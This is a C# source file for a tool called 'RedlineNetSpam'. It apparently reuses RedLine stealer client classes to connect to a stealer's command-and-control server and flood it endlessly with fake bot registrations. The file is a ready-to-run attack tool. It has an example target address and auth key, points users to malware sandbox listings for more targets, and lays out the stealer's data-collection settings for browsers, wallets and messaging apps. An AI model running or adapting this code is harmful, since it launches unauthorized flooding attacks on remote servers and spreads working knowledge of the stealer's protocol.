using Lucrative;
using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

// Token: 0x02000014 RID: 20
public static class Program
{
	static string address = "";
	static string auth = "";
	static string botnet = "";
	// Token: 0x06000076 RID: 118 RVA: 0x00002E3D File Offset: 0x0000103D
	private static void Main(string[] args)
	{
		Console.WriteLine(">>> Welcome to RedlineNetSpam <<<");

		
		if (args.Length < 3)
        {
			Console.WriteLine("Usage:");
			Console.WriteLine("\t" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + ".exe <address> <auth_value> <botnet>" );
			Console.WriteLine("\tExample: " + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + ".exe 62.204.41.141:24758 a6bcb8afefeb17eb22f2b08d282dde6c @SCAMHERE1");
			Console.WriteLine("\nOut of ideas? Visit https://tria.ge/s?q=family%3Aredline for fresh Redline samples!");
			Environment.Exit(1);
		}

		address = args[0];
		auth = args[1];
		botnet = args[2];

		Program.WriteLine(address, auth, botnet);


	}

	// Token: 0x06000077 RID: 119 RVA: 0x00005DC4 File Offset: 0x00003FC4
	public static void WriteLine(string address, string auth, string botnet)
	{
		int counter = 1;
		while (true)
        {
			string externalIP = "<Unknown>";
			try
            {
				string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
				externalIP = IPAddress.Parse(externalIpString).ToString();
			}
			catch
            {
				Logger.Log("Couldn't fetch our public IP this time.");
            }

			Logger.Log("Sending entry #" + counter.ToString() + " from IP " + externalIP);	
			counter++;	

			try
			{
				ConnectionProvider connectionProvider = new ConnectionProvider();
				bool flag = false;
				while (!flag)
				{
					Logger.Log("Now firing against " + address);

					if (connectionProvider.Id1(address, auth))
					{
						Logger.Log("Connected to target");
						flag = true;
						break;
					}
					else
                    {
						Logger.Log("Couldn't download settings");
						return;
					}
				}
				Entity_Settings settings = new Entity_Settings();
				Logger.Log("Trying to download settings from server");
				while (!connectionProvider.Id5(out settings))
				{					
					if (!connectionProvider.Id3())
					{
						Logger.Log("Throwing exception");
						throw new Exception();
					}
					Thread.Sleep(1000);
					
				}
				Logger.Log("Downloaded settings from server");
				Logger.Log("Setting - Collect Browsers: " + settings.CollectBrowsers.ToString());
				Logger.Log("Setting - Collect Wallets: " + settings.CollectWallets.ToString());
				Logger.Log("Setting - Collect VPN: " + settings.CollectVPN.ToString());				
				Logger.Log("Setting - Collect Telegram: " + settings.CollectTelegram.ToString());
				Logger.Log("Setting - Collect Discord: " + settings.CollectDiscord.ToString());
				Logger.Log("Setting - Collect FTP: " + settings.CollectFTP.ToString());
				Logger.Log("Setting - Collect Game Launchers: " + settings.CollectGameLaunchers.ToString());
				Logger.Log("Setting - Collect Screenshot: " + settings.CollectScreenshot.ToString());
				Logger.Log("Setting - Grab files: " + settings.GrabFiles.ToString());
				if (settings.GrabFiles)
                {
					foreach (string s in settings.AllowedFiles)
                    {
						Logger.Log("Setting - Targeted files - Allowed files: " + s);
					}
                }


				Entity_CollectedResults entity = new Entity_CollectedResults
				{
					BotID = botnet
				};
				Logger.Log("Setting Bot ID to " + botnet);
				EntityResolver entityResolver = ItemBase.Extract<EntityResolver>();
				while (!entityResolver.Invoker(connectionProvider, settings, ref entity))
				{
					Thread.Sleep(1000);
					Console.WriteLine("Sleeping");
				}
				Entity_CollectedResults user = entity;
				user.StolenData = new Entity_StolenData();
				user.Screenshot = null;
				IList<Entity_Task> tasks = new List<Entity_Task>();
				user.Id8 = "UNKNWON";
				
				while (!connectionProvider.Id26(user, out tasks))
				{
					if (!connectionProvider.Id3())
					{
						throw new Exception();
					}
					Thread.Sleep(10);
				}
				
				foreach (int taskId in new TaskResolver(entity).ReleaseUpdates(tasks))
				{
					Logger.Log("Got new task which we will gladly ignore:");
					foreach (Entity_Task task in tasks)
                    {
						Logger.Log("\t" + task.Id2);
					}
					/*
					while (!connectionProvider.Id27(user, taskId))
					{
						if (!connectionProvider.Id3())
						{
							throw new Exception();
						}
						Thread.Sleep(1000);
					}
					*/
				}
			}
			catch (Exception e)
			{
				Logger.Log("Looks like we got an exception: " + e.Message + "\n" + e.StackTrace);
				Program.WriteLine(address, auth, botnet);
			}
		}	
	}
}
